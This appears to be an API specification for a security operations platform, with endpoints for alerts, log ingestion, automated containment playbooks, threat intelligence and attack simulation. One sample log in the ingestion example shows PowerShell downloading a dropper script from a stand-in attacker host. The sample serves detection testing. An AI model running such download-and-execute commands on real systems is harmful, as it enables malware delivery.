# CyberShield Enterprise API Specification (v3.2)

Base URL: `http://127.0.0.1:8000`
WebSocket Feed: `ws://127.0.0.1:8000/ws/soc`

---

## 1. Security Alerts API

### `GET /api/v1/alerts`
Retrieve recent alerts matching criteria.
- **Query Parameters**:
  - `severity`: `INFORMATIONAL` | `LOW` | `MEDIUM` | `HIGH` | `CRITICAL`
  - `status`: `NEW` | `TRIAGED` | `IN_PROGRESS` | `CONTAINED` | `CLOSED_RESOLVED`
  - `limit`: Integer (1-1000, default: 100)
- **Response**: Array of `Alert` objects.

### `GET /api/v1/alerts/{alert_id}`
Retrieve a single alert by ID.

### `PATCH /api/v1/alerts/{alert_id}/triage`
Update triage status and analyst assignment.
- **Request Body**:
  ```json
  {
    "status": "CONTAINED",
    "assigned_analyst": "John Doe (Lead SOC Analyst)",
    "containment_action": "Subnet isolation executed"
  }
  ```

---

## 2. Telemetry Ingestion & CS-QL API

### `POST /api/v1/telemetry/ingest`
Ingest raw log string or JSON object.
- **Request Body**:
  ```json
  {
    "raw": "<34>Sep 12 10:00:00 ws-eng-01 powershell.exe[1420]: DownloadString http://evil.com/dropper.ps1"
  }
  ```
- **Response**: Normalized `NormalizedEvent` JSON.

### `POST /api/v1/telemetry/flow`
Ingest network flow for AI anomaly scoring.
- **Request Body**:
  ```json
  {
    "source_ip": "10.0.1.55",
    "destination_ip": "198.51.100.23",
    "source_port": 50120,
    "destination_port": 443,
    "bytes_sent": 85000000,
    "bytes_received": 1200,
    "packets_sent": 45000,
    "packets_received": 50,
    "duration_ms": 3200.0,
    "tcp_flags": ["ACK", "PSH"],
    "byte_entropy": 7.85
  }
  ```

### `POST /api/v1/telemetry/csql`
Execute CS-QL query.
- **Request Body**:
  ```json
  {
    "query": "process_name contains 'powershell' | stats count by host_name",
    "target": "events"
  }
  ```

---

## 3. SOAR Automation API

### `GET /api/v1/soar/playbooks`
List available response playbooks.

### `POST /api/v1/soar/execute`
Trigger automated containment playbook against an infected entity.
- **Request Body**:
  ```json
  {
    "playbook_id": "PB-RANSOMWARE-01",
    "target_entity": "ws-finance-08.corp",
    "executed_by": "SOC Analyst",
    "context": {
      "host": "ws-finance-08.corp",
      "user": "mscott",
      "source_ip": "45.33.32.156"
    }
  }
  ```

### `GET /api/v1/soar/containment`
Fetch current active quarantines, firewall blocks, and account locks.

---

## 4. Threat Intelligence API

### `GET /api/v1/intel/mitre/heatmap`
Return real-time MITRE ATT&CK 14 tactics matrix and active technique counts.

### `GET /api/v1/intel/ioc/lookup?value=198.51.100.23`
Sub-millisecond Bloom-filter IoC lookup.

### `GET /api/v1/intel/cve`
List local enterprise CVE vulnerability records.

---

## 5. Cyber Attack Simulation API

### `POST /api/v1/simulation/ransomware`
Simulate ransomware encryption spike and test automated containment.

### `POST /api/v1/simulation/bruteforce`
Simulate distributed authentication spray and account lockout.

### `POST /api/v1/simulation/sqli`
Simulate SQL injection and web attack payload.

### `POST /api/v1/simulation/apt29`
Simulate full APT29 lateral movement and Mimikatz credential dumping.

### `POST /api/v1/simulation/exfil`
Simulate anomalous high-entropy data exfiltration flow.

---

## 6. System Health & WebSocket API

### `GET /api/v1/system/metrics`
Return engine uptime, event bus stats, and ingestion counters.

### `WebSocket /ws/soc`
Persistent bidirectional JSON streaming socket for SOC analyst consoles.
- Broadcast packets:
  ```json
  {
    "type": "alert.new",
    "timestamp": "2026-09-12T10:00:00Z",
    "priority": 2,
    "data": { ...Alert model... }
  }
  ```
